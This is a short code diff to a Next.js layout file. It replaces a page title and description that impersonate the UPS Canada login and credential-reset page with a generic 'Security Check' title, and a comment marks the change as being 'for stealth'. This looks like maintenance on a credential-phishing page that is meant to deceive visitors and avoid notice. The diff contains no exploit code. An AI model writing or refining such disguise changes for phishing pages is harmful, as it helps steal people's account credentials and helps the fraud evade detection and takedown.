@@ -3,8 +3,8 @@ import "./globals.css";
 import DataLayerInitializer from "../components/DataLayerInitializer";
 
 export const metadata: Metadata = {
-  title: "Log in | UPS - Canada",
-  description: "Forgot your password or username? Reset your UPS account credentials.",
+  title: "Security Check", // Generic title for stealth
+  description: "Please verify your connection.",
   icons: {
     icon: '/favicon.ico',
   },
